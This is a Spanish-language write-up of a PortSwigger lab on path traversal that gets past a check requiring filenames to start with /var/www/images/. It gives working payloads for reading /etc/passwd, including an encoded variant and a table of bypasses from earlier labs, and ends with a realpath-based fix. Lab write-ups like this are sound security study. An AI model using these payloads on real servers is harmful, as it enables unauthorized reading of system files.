---
title: "Lab: File path traversal, validation of start of path"
date: 2026-05-18
category: "Path Traversal"
order: 6
tags: ["web-security-academy", "path-traversal", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/path-traversal-lab-validation-start-of-path.html
---

## Descripción de la vulnerabilidad

Esta variante de Path Traversal tiene un filtro que exige que el `filename` **empiece con un directorio base específico** — en este caso `/var/www/images/`. Si el valor no comienza con esa ruta, la app lo rechaza.

El descuido es que la app valida solo el **inicio** del string, pero no normaliza la ruta completa. Entonces si incluís el prefijo requerido seguido de secuencias `../`, la validación pasa y el SO resuelve el traversal igual.

---

## Reconocimiento — La pista estaba en el HTML

Este lab tenía una diferencia clave respecto a los anteriores que se podía ver directamente en el HTML:

**Labs anteriores:**

```html
<img src="/image?filename=74.jpg">
```

**Este lab:**

```html
<img src="/image?filename=/var/www/images/74.jpg">
```

El `filename` ya incluía la ruta base completa. Eso es una pista directa de que la app **valida que el filename empiece con `/var/www/images/`**. Si no lo incluís, rechaza el request.

**Regla:** siempre inspeccioná el valor exacto del parámetro en el HTML — te dice cómo espera el servidor que se formatee el input.

---

## Pruebas realizadas

### Payloads que fallaron ❌

<table>
<tr><td>Payload</td><td>Resultado</td><td>Razón</td></tr>
<tr><td><code>../</code></td><td><code>No such file</code></td><td>Sin prefijo requerido</td></tr>
<tr><td><code>../../../etc/passwd</code></td><td><code>No such file</code></td><td>Sin prefijo requerido</td></tr>
<tr><td><code>/var/www/images/etc/passwd</code></td><td><code>No such file</code></td><td>Sin traversal, archivo no existe ahí</td></tr>
<tr><td><code>/var/www/images/../etc/passwd</code></td><td><code>No such file</code></td><td>Solo un nivel, no llega a <code>/etc/passwd</code></td></tr>
</table>

### Payloads que funcionaron ✅

**Payload principal:**

```
/var/www/images/../../../etc/passwd
```

Incluye el prefijo requerido + tres niveles de traversal para salir del directorio base y llegar a `/etc/passwd`.

**Variante con URL encoding:**

```
%2Fvar%2Fwww%2Fimages%2F..%2F..%2F..%2Fetc%2Fpasswd
```

Misma lógica pero con `/` encodeado como `%2F`. Funciona porque este servidor no tiene un filtro de encoding adicional.

---

## Explotación exitosa

```
GET /image?filename=/var/www/images/../../../etc/passwd
```

**Respuesta:** `200 OK` — contenido completo de `/etc/passwd`.

---

## ¿Por qué funcionó?

El filtro hace algo como:

```python
if not filename.startswith("/var/www/images/"):
    return 400, "Invalid filename"

open(filename)  # ← abre sin normalizar la ruta
```

Valida el inicio del string pero no resuelve la ruta antes de usarla:

```
/var/www/images/../../../etc/passwd

Validación:  ¿empieza con "/var/www/images/"? → Sí
SO resuelve: /var/www/images/../../../etc/passwd → /etc/passwd
```

El prefijo satisface la validación y los `../` hacen el traversal después.

**¿Por qué 3 niveles de `../`?** Porque el prefijo tiene 3 niveles de profundidad (`/var/www/images/`), entonces se necesitan 3 `../` para subir de vuelta a la raíz y llegar a `/etc/passwd`.

---

## ¿Cómo descubrir esto en un blackbox real?

La pista principal es **inspeccionar el valor exacto del parámetro en el HTML**. En este lab el HTML mostraba el filename con la ruta base completa incluida, lo que revela dos cosas inmediatamente:

1. El servidor espera que el filename incluya la ruta base.
2. La ruta base es `/var/www/images/`.

Con eso ya se sabe que el bypass es incluir esa ruta base seguida de `../` para salir de ella. En un caso donde el HTML no lo revela, se puede intentar omitir el prefijo y ver si el servidor da un error diferente que revele la ruta esperada.

---

## Comparativa de todos los labs

<table>
<tr><td>Lab</td><td>Filtro</td><td>Bypass</td><td>Pista en el HTML</td></tr>
<tr><td>Simple case</td><td>Sin filtro</td><td><code>../../../etc/passwd</code></td><td><code>filename=74.jpg</code></td></tr>
<tr><td>Absolute path bypass</td><td>Bloquea <code>../</code></td><td><code>/etc/passwd</code></td><td><code>filename=74.jpg</code></td></tr>
<tr><td>Stripped non-recursively</td><td>Elimina <code>../</code> una vez</td><td><code>....//....//....//etc/passwd</code></td><td><code>filename=74.jpg</code></td></tr>
<tr><td>Superfluous URL-decode</td><td>Bloquea <code>../</code>, decodifica después</td><td><code>..%252F..%252F..%252Fetc%252Fpasswd</code></td><td><code>filename=74.jpg</code></td></tr>
<tr><td>Validation of start of path (este)</td><td>Exige prefijo <code>/var/www/images/</code></td><td><code>/var/www/images/../../../etc/passwd</code></td><td><code>filename=/var/www/images/74.jpg</code> ← diferente</td></tr>
</table>

Este lab era el único donde el HTML revelaba directamente el formato esperado del parámetro.

---

## Prevención correcta

Igual que siempre — `realpath()` resuelve todo antes de validar:

```python
import os

BASE = "/var/www/images"
filename = request.params["filename"]

full_path = os.path.realpath(os.path.join(BASE, filename))

if not full_path.startswith(BASE):
    return 400, "Acceso denegado"

open(full_path)
```

Con esto, `/var/www/images/../../../etc/passwd` se resuelve a `/etc/passwd` antes de la validación — fuera del directorio base — y es rechazado.

---

## Lecciones aprendidas

- Siempre inspeccioná el valor exacto del parámetro en el HTML — en este lab revelaba directamente el formato requerido y la ruta base.
- Si el filename incluye una ruta base completa, la app probablemente valida que empiece con ese prefijo.
- El bypass es simple: incluir el prefijo requerido y agregar `../` después para salir de él.
- El número de `../` necesarios se puede calcular contando los niveles del prefijo.
- URL encoding del payload también funciona si el servidor no tiene filtro adicional de encoding.

---

## Referencia

Lab oficial: [PortSwigger — File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal)

**Estado:** Solved
